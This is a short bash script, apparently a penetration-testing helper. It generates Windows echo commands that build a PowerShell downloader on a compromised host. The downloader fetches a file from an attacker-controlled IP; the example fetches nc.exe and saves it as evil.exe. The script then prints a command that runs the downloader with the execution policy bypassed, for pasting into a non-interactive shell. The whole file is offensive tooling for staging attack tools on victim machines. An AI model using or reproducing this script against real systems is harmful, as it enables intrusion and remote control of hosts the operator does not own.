#!/bin/bash

function helper() {
  echo "[*] Simple windows wget powershell command generation"
  echo "[*] Usage: $0 <ip addr> <filename> <output> <ps1 file>"
  echo "[*] Example:"
  echo -e "[*] \t$0 10.0.0.1 nc.exe evil.exe wget.ps1"
  echo "[*]"
  echo "[*] Copy/Past and GG WP"
  echo "[*] Into non interactive shell"
  exit 0
}

if [ -z $1 ] || [ -z $2 ] || [ -z $3 ] || [ -z $4 ]; then
  helper
fi

echo "[*] Simple windows wget powershell command generation"
echo "[*] Copy/Past and GG WP"
echo ""

echo "
echo \$storageDir = \$pwd > $4 
echo \$webclient = New-Object System.Net.WebClient >> $4
echo \$url = \"http://$1/$2\" >> $4
echo \$file = \"$3\" >> $4
echo \$webclient.DownloadFile(\$url,\$file) >> $4
"
echo "[*] Don't forget to hit enter one time after copy pasting!"
echo "[*] powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $4"
echo ""